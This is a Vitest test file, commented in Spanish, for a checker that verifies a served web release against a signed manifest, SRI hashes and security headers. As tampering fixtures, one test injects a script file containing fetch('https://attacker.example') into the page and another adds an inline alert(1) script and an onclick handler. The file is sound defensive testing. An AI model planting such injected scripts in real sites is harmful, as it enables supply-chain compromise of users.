// P20.T02: el chequeo contra un release servido por HTTP real. OK con el release intacto; MISMATCH ante cualquier
// diferencia con lo firmado (archivo alterado o faltante, script agregado o inline, SRI cambiado, firma inválida o de
// otra clave, manifest no canónico, otra app u otro entorno, headers relajados, service workers servidos); UNREACHABLE
// si el sitio no responde.
import { generateKeyPairSync } from 'node:crypto';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { checkRelease } from '../src/check.ts';
import { startSite, type TestSite } from './helpers/site.ts';

let site: TestSite;

beforeEach(async () => {
  site = await startSite();
});

afterEach(async () => {
  await site.close();
});

const check = (overrides: { environment?: string; app?: 'WALLET' | 'RECOVERY' } = {}) =>
  checkRelease(
    { app: overrides.app ?? 'RECOVERY', url: site.url },
    { releaseKeys: [site.releaseKey.publicKey], environment: overrides.environment ?? 'local', timeoutMs: 5_000 },
  );

describe('release intacto', () => {
  it('OK con el release id, el SHA-256 del manifest y todos los archivos revisados', async () => {
    const result = await check();
    expect(result).toMatchObject({
      app: 'RECOVERY',
      status: 'OK',
      releaseId: 'recovery-local-0000000000a1',
      problems: [],
    });
    expect(result.manifestSha256).toMatch(/^[0-9a-f]{64}$/);
    expect(result.files).toBe(6);
  });
});

describe('rotación de la clave de release', () => {
  it('durante el solapamiento verifica con cualquiera de las claves fijadas', async () => {
    const previous = generateKeyPairSync('ed25519');
    const result = await checkRelease(
      { app: 'RECOVERY', url: site.url },
      { releaseKeys: [previous.publicKey, site.releaseKey.publicKey], environment: 'local', timeoutMs: 5_000 },
    );
    expect(result.status).toBe('OK');
  });
});

describe('MISMATCH', () => {
  it('un archivo alterado', async () => {
    site.write('assets/chunk-a1.js', 'export const answer = 43;\n');
    const result = await check();
    expect(result.status).toBe('MISMATCH');
    expect(result.problems).toContain('assets/chunk-a1.js: el contenido no coincide con el manifest');
  });

  it('un script del documento que no figura en el manifest (aunque el manifest se re-firme)', async () => {
    const html = site.read('index.html').replace('</head>', '<script src="/assets/evil.js"></script></head>');
    site.write('index.html', html);
    site.republish();
    site.write('assets/evil.js', 'fetch("https://attacker.example")');
    const result = await check();
    expect(result.status).toBe('MISMATCH');
    expect(result.problems).toContain('index.html: /assets/evil.js no figura en el manifest');
  });

  it('el documento servido en / alterado', async () => {
    site.write('index.html', site.read('index.html').replace('<div id="root">', '<div id="root" data-x="1">'));
    const result = await check();
    expect(result.status).toBe('MISMATCH');
    expect(result.problems).toEqual(
      expect.arrayContaining([
        'index.html: el contenido no coincide con el manifest',
        'index.html no figura en el manifest o no coincide',
      ]),
    );
  });

  it('script inline, manejador on* y recurso de otro origin en el documento (aunque el manifest se re-firme)', async () => {
    const html = site
      .read('index.html')
      .replace(
        '<div id="root"></div>',
        '<div id="root" onclick="x()"></div><script>alert(1)</script><img src="https://cdn.example/x.png">',
      );
    site.write('index.html', html);
    site.republish();
    const result = await check();
    expect(result.status).toBe('MISMATCH');
    expect(result.problems).toEqual(
      expect.arrayContaining([
        'index.html: script inline',
        'index.html: manejador inline onclick en <div>',
        'index.html: src="https://cdn.example/x.png" en <img> no es del mismo origin',
      ]),
    );
  });

  it('SRI cambiado o ausente (con el manifest re-firmado)', async () => {
    site.write('index.html', site.read('index.html').replace(/ integrity="[^"]+"><\/script>/, '></script>'));
    site.republish();
    const result = await check();
    expect(result.status).toBe('MISMATCH');
    expect(result.problems).toContain('index.html: /assets/index-a1.js sin integrity (SRI)');
  });

  it('firma del manifest inválida o de otra clave', async () => {
    site.write('.well-known/release-manifest.json.sig', Buffer.alloc(64, 1).toString('base64'));
    expect((await check()).problems).toEqual(['la firma del manifest no verifica con la clave de release fijada']);
    const other = generateKeyPairSync('ed25519');
    const result = await checkRelease(
      { app: 'RECOVERY', url: site.url },
      { releaseKeys: [other.publicKey], environment: 'local', timeoutMs: 5_000 },
    );
    expect(result.status).toBe('MISMATCH');
  });

  it('manifest no canónico, otra app u otro entorno', async () => {
    expect((await check({ app: 'WALLET' })).problems).toContain('el manifest es de la app recovery');
    expect((await check({ environment: 'production' })).problems).toContain(
      'el manifest es del entorno local, no de production',
    );
    const manifest = site.read('.well-known/release-manifest.json');
    site.write('.well-known/release-manifest.json', `${manifest}\n`);
    const result = await check();
    expect(result.status).toBe('MISMATCH');
  });

  it('un archivo del manifest que falta', async () => {
    site.write('.well-known/release-manifest.json', site.read('.well-known/release-manifest.json'));
    const { rmSync } = await import('node:fs');
    rmSync(`${site.dir}/favicon.svg`);
    const result = await check();
    expect(result.status).toBe('MISMATCH');
    expect(result.problems).toContain('favicon.svg: HTTP 404');
  });

  it('headers relajados o faltantes respecto de los del release', async () => {
    site.overrideHeader('Content-Security-Policy', "default-src *; script-src 'self' 'unsafe-inline'");
    site.overrideHeader('Cross-Origin-Opener-Policy', null);
    const result = await check();
    expect(result.status).toBe('MISMATCH');
    expect(result.problems).toEqual(
      expect.arrayContaining([
        '/: el header Content-Security-Policy no coincide con el release',
        '/: falta el header Cross-Origin-Opener-Policy',
      ]),
    );
  });

  it('la cámara habilitada fuera de sus rutas', async () => {
    site.overrideHeader('Permissions-Policy', 'camera=(self), microphone=()');
    const result = await check();
    expect(result.problems).toContain('/: el header Permissions-Policy no coincide con el release');
  });
});

describe('UNREACHABLE', () => {
  it('el sitio no responde', async () => {
    const url = site.url;
    await site.close();
    site = await startSite();
    const result = await checkRelease(
      { app: 'RECOVERY', url },
      { releaseKeys: [site.releaseKey.publicKey], environment: 'local', timeoutMs: 2_000 },
    );
    expect(result).toMatchObject({ status: 'UNREACHABLE', releaseId: null });
  });
});
